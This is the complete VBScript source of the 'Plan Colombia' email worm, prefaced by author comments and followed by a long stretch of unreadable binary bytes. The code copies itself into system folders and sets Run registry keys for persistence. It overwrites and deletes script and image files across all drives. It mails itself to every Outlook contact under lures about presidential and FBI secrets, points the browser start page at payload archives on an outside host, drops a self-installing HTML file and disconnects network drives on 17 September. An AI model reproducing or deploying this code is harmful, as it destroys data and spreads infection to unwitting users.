rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogot?2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina Mar?" from "Santa fe de Bogot?
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP"
 Else
  If numero = 2 Then
    polye = ".JPG"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub


                                                                                                                              �m��3BmR�i5��$Ly�m�S��&J�O�$��f<:���C.� c��Uy�Í=�C���9�o�Ǐ6� Z�i-3�L_%w��_��&�A��www�I��#��<��23�$�]ɡ-�==|�ض\�g�0�G�'{�$���<�!F�qG������?I��m� �N˒���'<Y�q���z�=ji/��K�+�3;��!rG�r��@\�$�O04>ٰ����<�0��A��L��*����������Ѓ��In�߁�U�q2M�1#���1qu����1�k*I�|]���%�� 0��y��Qm$�'��В,t�>-ZO�S���0 Ŵ]x������azM��ߓi:�d��`��|I/��<�C�8�4Z���ڼ���,]�eI���̸l�7�<닽p�x���'��Ë}Ǉ�a�C�׋ {a�N[x���Œ�n��Ė��}�䙮\I6�����G<�x�{0�oL<�@eo^%��{zg^���*�^:�k��%IT�za��v��x�M�yu���x��h�íRi�߷�k�v��T� K�`   �@�  
X#Xߠj��h�j�������k �}��+�^Lx|N��5��#����N���ǃ8��W���@��`���0 �}�7��8�����y���9U񠷯,�h����e�� W��3��2����`�u{ i'�:e?�� ��ck���W���F�`!^@�꼹�ב�^<��� :^�;`� <�����-���x@aU犪� �`��7� �_��ux�áP����P\l�W���n��P�C�08��À^{�����@.�:��@Ba��M0��?�;�k^x� ������W�?�	> �"�@�h�`�x���B`���z���`5u�k��$`0�������3|A� 7�px(����ʞ,�2�]_�@�|`>Xx$
��	�3����Nl <���1 ������@��> �#׾�^����o8����9�V���_�@��'���� 󇀾'.��.��Xx�����:��1�^8�H�j��`6��f�悄W��À�<��,�W� �Exq: ]y���Z����^H�ux�8D�0���DW���/�?�k� �����CC��ƀ8���|�@>�?�<�}}�^�p����W�(�xU|8]y}|��W�.R}�^P�}{���tA���{���t�x�]ױ��:��������U��� ���������� $Udd  �!秩��  ��@ !��K#Yzb��V���)�*r�x��Eb�z�hV��lG@X�+!.�w(�&Z�Z`�P}���UL�����{������fvg�z�ffgVue�a��wkZ�w�u�ljEӝka�[�Cr����J��\%�[�7 rw7�ؽV`cv7<sM�f��0C!����Jkx��4=!�;04bh�%RU��#zG�뾹8��H��	���5����ͪN��z���n��#p.�VE��b�H��W�z��x{���zgK԰�P\�XuD�6�N���Â�$B�h��s��=��d"ƒiz��؊ugVu�"�G53T�%���ю�fk0sf��or�����]���ůf�h+2��g��Yel�a����h��hX�6�m�kZ0Zт�hLР���{���n�����J��DeTVUe���gl$I&eUF�kn7HKӜ�}'[��GBUt��N���kd֪����[�h�yE�U1�e�{cf5*
�T)�J@��� fDDfDfDDDDD�I$q�I      
U T��8�I�Q%Y5�m��a��mgdu���^��#~H��'��8c�9��he�d�H��y��hd�H��Z"�)ēN$�p��6jl��I�X�%ѫ�VE�5ME�l]P$	�t��jn�T�4���p�N�F�1�c�&NL��N�����l/��+|߿���'%iX�=NQ
Ɖ�ۍ�j�L[Bb�.r\��Q�[�5bX���s[�@�I8"k�iYIDi�b��M�W�c�����]S������-��#���3��bͳ�����/@�}\1���Z�*ƉV%NJz��C2	L�Ѵ��\W���S�dY�k�4l�)ԵjZ�I�F"�R�G,z5c�s��E�PT��-�d^ș&J��3�j8����6��MJ��h��!N)���x�#�V6�2�eYK�&���i$Um[Y�is��ebF���0���:x��[�P������<��[�7�oJ꺞�=��k�ꅫ����򴬖%�J��ͣ*5��9�Oh8�1ds� @,W��y�ۣ�ꮫm+H�>
��H�&��-KQ��B!:�z]���)�S�i<�{&>IFʭ�b4�$iڶ�h���R��6��˳~ߦ���m�kU`�c&�M ��͓�'�l[��D�$[Vյm[V�H�ZִIZѤ���9�lR ��\�=�s\歋cd�ɭ�h޷�ĺ���%C��,����m#m��� ��� fUUUUfUDUDU��-m"@      
���������@��QFUV�q�܎8��'����8#�)$�Y�he�9��J$�����.��ez�]�Wv�hy��{���ݝ�qZ*"�5��᝚٩�ֵ�țyj7%k`� �
�b���(=(������c�:��2C$V�6`&
!�( XՆ�``�����l�e�yiY�V$����i��_	=ݝ�N�����d��U]�Zʞ���y<��[H�rA�z7_fX��&vggwww:t��Ҥ�V)aD�`�U�iÚf�x���Q���D*2!Q�a����#v�h�ywl�ٵe�^D�U�^��$�R%�b�xe�Xm���kf��9<6*E�r܂7�xecV7=�{�if������$I��a����s�Xx��#�0hA=H����xBA2�<�ٝ�P�g�,�Ϝ�%�,^���)U�����R�b��Pfׅ:�($n�ZE�6ugVhf��ы�EH[��Y�\�j�Zm��aĚa�if��m���b��ӾjUۑ�n�wwwgfvs��=U�Y�k:�����]%�]Yָ>̜�M��>kcã(]�������x��xw�ϋ��]��6 �F�ᕙY��a2̶mf�J嶶BY�R�jT�8�f8Yvgf�ȍ{�����Iu]fffV6ѭSQ�!�]��A�뾻n7.\kJ��R�az��&o��TH��|��cA����{����i�T�_؋8����^����� fUDUDfUDDDT�I-m$�      
�
����8��U5Se%YIVUV����vH�`�(��Ib�)��i!�Z�����I$�eu++�~�����Wh����m�61�Y�$I֘�F�徤zHH��,�n�q���r� �@���t-\	w�u�l{��>�m[S��Fݙl�Xef��!P�9Sm6�V�	��"�i�v7�Ѓ�EDU�l��<ٍ�D��Yk[!�mvgf��6յf�jJ:|��~�[����i&/�_�Qp�(��]�ٌ�I��1I��'w�nL������T�E��P�#��6R��AF��~��"��X!��l�c�b��Vd                    �
L� ���������� $Ubb  �!�	��  �	1���k�~.��f�Q�4�׼�����>�&��~��8pxt>�G]xX�t:7��$t7������ >�` �=`-���7�:�t@5�Dh�(:�����1 ��u���7�� o_�UxH�{��q�����Dj� p���ו>^u-�hz�� ����tސ��cH���@v�4���ͺ�l ���^�� _�^;U�� �:�Py��u����=Pat>�ӣ@�y``���":j�C�������]׆UU�@��^H}����>���U}����󪼐��X��}}���2�*��ux}�:>��W�׺����^\����u�O��